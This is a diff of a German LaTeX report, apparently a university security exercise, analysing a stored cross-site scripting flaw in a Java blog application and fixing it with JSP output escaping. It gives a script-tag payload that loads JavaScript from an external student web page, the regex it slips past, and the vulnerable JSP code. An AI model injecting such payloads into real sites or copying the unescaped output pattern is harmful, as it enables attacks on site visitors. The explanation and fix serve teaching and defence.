@@ -2,27 +2,88 @@
 
 \subsection{Vulnerability: Cross-Site Scripting}
 
-Das Blog ist anfällig für Cross-Site Scripting. Das Problem liegt darin, dass die Eingabedaten beim Erzeugen eines neuen Blog-Eintrags nur unzureichend gefiltert werden. Beim erneuten Anzeigen eines betroffenen Blog-Eintrags werden diese - potentiell gefährlichen - Daten dann an den Browsers gesendet und dort ausgeführt. 
+Das Blog ist anfällig für Cross-Site Scripting. Das Problem liegt darin, dass die Eingabedaten beim Erzeugen eines neuen Blog-Eintrags nur unzureichend gefiltert werden. Beim erneuten Anzeigen eines betroffenen Blog-Eintrags werden diese Daten - die z. B. beliebigen JavaScript-Code enthalten können - dann an den Browsers gesendet und dort ausgeführt.
 
-Ein konkretes Beispiel für einen Angriff: Der Angreifer "evil\_häcker" legt einen neuen Blog-Eintrag an. Im Formular auf newPost.html gibt er als Benutzernamen - wahrheitsgemäß - "evil\_häcker" ein. Als Text des Blog-Eintrags wählt er (MUSS ICH NOCH EINFÜGEN).
+Ein konkretes Beispiel für einen Angriff: Der Angreifer \emph{evil\_hacker} legt einen neuen Blog-Eintrag an. Im Formular auf \url{newPost.html} gibt er als Benutzernamen wahrheitsgemäß \lstinline$evil_hacker$ ein. Als Text des Blog-Eintrags wählt er \lstinline$<SCRIPT SRC=http://web.student.tuwien.ac.at/~e9902433/xss.js></SCRIPT>$.
 
-Im Servlet, das den Post-Request entgegen nimmt (gui.controller.BlogServlet) wird die Eingabe zwar validiert, bevor sie in die (In-Memory-)Datenbank geschrieben wird. Leider ist der verwendete Validator (gui.helper.ScriptTagValidator) nicht ausreichend. Die verwendete Regulary Expression matcht nur Script-Tags, die keine Attribute zwischen dem Wort "script" und der schließenden Spitz-Klammer enthalten. Durch die Angabe "src="NOCH EINFÜGEN"" lässt sich der Validator also in die Irre führen und lässt die Eingabe ungefiltert durch.
+Im Servlet, das den Post-Request entgegen nimmt (\url{gui.controller.BlogServlet}) wird die Eingabe zwar validiert, bevor sie in die (In-Memory-)Datenbank geschrieben wird. Leider ist der verwendete Validator (\url{gui.helper.ScriptTagValidator}) nicht ausreichend. Die verwendete Regular Expression \lstinline$.*< *[Ss][Cc][Rr][Ii][Pp][Tt] *>.*"$ matcht nur Script-Tags, die keine Attribute zwischen dem Wort "script" und der schließenden Spitz-Klammer enthalten. Durch die Angabe \lstinline$SRC=http://web.student.tuwien.ac.at/~e9902433/xss.js$ lässt sich der Validator also in die Irre führen und lässt die Eingabe ungefiltert durch.
+
+Auf dem Webspace von \emph{evil\_hacker} liegt unter der URL \url{SRC=http://web.student.tuwien.ac.at/~e9902433/xss.js} eine JavaScript-Datei mit dem folgenden Inhalt:
+
+\begin{lstlisting}
+document.write('This is the evil script!')
+\end{lstlisting}
 
 Da bei der Ausgabe der Blog-Einträge die Inhalte überhaupt nicht mehr gefiltert werden, wird also der folgende Text als Blog-Eintrag wieder ausgegeben (z. B. in archive.jsp). Im Browser wird das Script-Tag dann so behandelt, als würde es aus vertrauenswürdiger Quelle kommen: Das Script von der angegebenen URL wird heruntergeladenen und ausgeführt. Im konkreten Fall wird dadurch an der Stelle, an der sich das Script-Tag befand der Text "This is the evil script" ausgegeben.
 
-Der Vollständigkeit halber soll darauf hinwiesen werden, wenn der Angreifer das Script-Tag als Autoren-Namen und nicht als Blog-Text eingegeben hätte, da diese beiden Werte auf exakt dieselbe Art behandelt werden.
+Der Vollständigkeit halber soll darauf hinwiesen werden, dass der Angriff auch funktionieren würde, wenn der Angreifer das Script-Tag als Autoren-Namen und nicht als Blog-Text eingegeben hätte, da diese beiden Werte auf exakt dieselbe Art behandelt werden.
 
 \subsection{Lösung: Escapen beim erneuten Anzeigen}
 
-Die beste Lösung, um Cross-Site Scripting in diesem konkreten Fall vorzubeugen, liegt darin, die Blog-Daten (Autoren und Inhalte) bei der erneuten Ausgabe zu filtern. Dabei werden potentiell gefährliche Zeichen wie < und > durch entsprechende Escape-Sequenzen ersetzt, der Angriffs-Text aus dem Beispiel wird dadurch zu: ...
+Ein erster Versuch, das Programm sicherer zu machen, wäre, die Regular Expression anzupassen, so dass auch Script-Tags mit einem src-Attribut als gefährlich erkannt und ausgefilter würden. Also z. B. \lstinline$.*< *[Ss][Cc][Rr][Ii][Pp][Tt] *([Ss][Rr][Cc].*)+>.*"$. Dies ist allerdings fehleranfällig und lässt außerdem andere Möglichkeiten des Cross-Site Scripting außer Acht.
 
-Im Browser werden diese Escape-Sequenzen dann durch die entsprechenden Zeichen ersetzt und am Bildschirm ausgegeben. Im Unterschied zum nicht gefilterten Text wird das Script-Tag allerdings \emph{nicht ausgeführt} - der Browser behandelt es als ganz normalen Text.
+Die einfachste Lösung, um Cross-Site Scripting in diesem konkreten Fall vorzubeugen, liegt darin, die Blog-Daten (Autoren und Inhalte) nicht bei der Eingabe, sondern erst bei der Ausgabe zu filtern. Anders als z. B. bei Formen der SQL-Injection ist der Code im Rahmen eines Cross-Site Scripting Angriffs erst dann gefährlich, wenn er wieder an einen Browser ausgegeben wird. Da auf dem Server kein HTML nach Script-Tags geparst und kein JavaScript interpretiert wird, ist z. B. der oben gezeigt Angriff für den Server ungefährlich.
 
-Eine kurze Recherche im Internet zeigt, dass Varialben-Werte in Servlet-Tags in JSP generell nicht gefiltert/escaped werden. Im Gegensatz dazu werden Variablen-Werte in Expression Language-Tags in JSP (per Default) \emph{immer} escaped. Um die Ausgabe-Werte zu escapen ist es also lediglich notwendig, die entsprechenden Servlet-Abschnitte durch Expression Language zu ersetzen, genauer gesagt durch c:forEach für den Schleifen-Durchgang (ist das überhaupt notwendig?) und durch c:out für die eigentliche Ausgabe. Das Tag c:out führt dann das eigentlich Escapen durch.
+Sinnvoller ist es daher, die gespeicherten Daten erst bei der erneuten Ausgabe zu filtern und gegebenenfalls in eine Form zu transformieren, die dem Opfer nicht mehr gefährlich werden kann. Im konkreten Fall heißt das: In eine Form, die vom Browser des Opfers nicht als JavaScript-Tag erkannt und daher auch nicht ausgeführt (sondern einfach als Inhalt der Website dargestellt) wird. Diese Transformation ist allgemein als Escapen bekannt: Dabei werden potentiell gefährliche Zeichen wie < und > durch entsprechende Escape-Sequenzen ersetzt. Der Angriffs-Text aus dem Beispiel wird dadurch zu \lstinline$&lt;SCRIPT SRC=http://web.student.tuwien.ac.at/~e9902433/xss.js&gt;&lt;/SCRIPT&gt;$. Aus der Sicht des Web-Browsers ist dies überhaupt kein Script-Tag mehr, sondern einfach eine Zeichenkette, die mit dem Zeichen \lstinline$&lt$ beginnt. Als solche wird sie einfach als Inhalt der Website 
 
-Die beiden folgenden Code-Beispiele zeigen die Änderungen am Beispiel von archive.jsp. Das erste Beispiel zeigt die anfällige Variante, das zweite Beispiel die verbesserte Version.
+Eine kurze Recherche im Internet zeigt, dass Variablen-Werte in Servlet-Tags in JSP generell nicht gefiltert/escaped werden. Im Gegensatz dazu werden Variablen-Werte in \emph{Expression Language-Tags} in JSP (per Default) \emph{immer} escaped. Um die Ausgabe-Werte zu escapen ist es also lediglich notwendig, die entsprechenden Servlet-Abschnitte durch Expression Language zu ersetzen, genauer gesagt durch <c:forEach> für den Schleifen-Durchgang und <c:out> für die eigentliche Ausgabe. Das Tag <c:out> führt dann das eigentlich Escapen durch.
 
-EINFÜGEN
+Die beiden folgenden Code-Beispiele zeigen die Änderungen am Beispiel von \url{archive.jsp}. Das erste Beispiel zeigt die anfällige Variante, das zweite Beispiel die verbesserte Version.
+
+\begin{lstlisting}
+<jsp:useBean id="bean" class="gui.model.SearchResultBean" scope="session"/>
+<%@page import="gui.model.PostBean"%>
+<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
+    pageEncoding="ISO-8859-1"%>
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+<title>Insert title here</title>
+</head>
+<body>
+<%for (PostBean post:bean.getResults()){ %>
+<div class=post>
+	<h3 class=author>
+		<%=post.getAuthor() %>
+	</h3>
+	<div class=content>
+		<%=post.getContent() %>
+	</div>
+</div>
+<%} %>
+</body>
+</html>
+\end{lstlisting}
+
+\begin{lstlisting}
+<jsp:useBean id="bean" class="gui.model.SearchResultBean" scope="session"/>
+<%@ page isELIgnored="false" %>
+<%@ page import="gui.model.PostBean"%>
+<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
+    pageEncoding="ISO-8859-1"%>
+<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>    
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+<title>Insert Titel here</title>
+</head>
+<body>
+<c:forEach var="post" items="${sessionScope.bean.results}">
+<p>Entry</p>
+<div class=post>
+	<h3 class=author>
+		<c:out value="${post.author}"/>
+	</h3>
+	<div class=content>
+		<c:out value="${post.content}"/>
+	</div>
+</div>
+</c:forEach>
+</body>
+</html>
+\end{lstlisting}
 
 Man beachte, dass zwei weitere Veränderungen notwendig sind, um die EL-Tags verwenden zu können.
 \begin{enumerate}
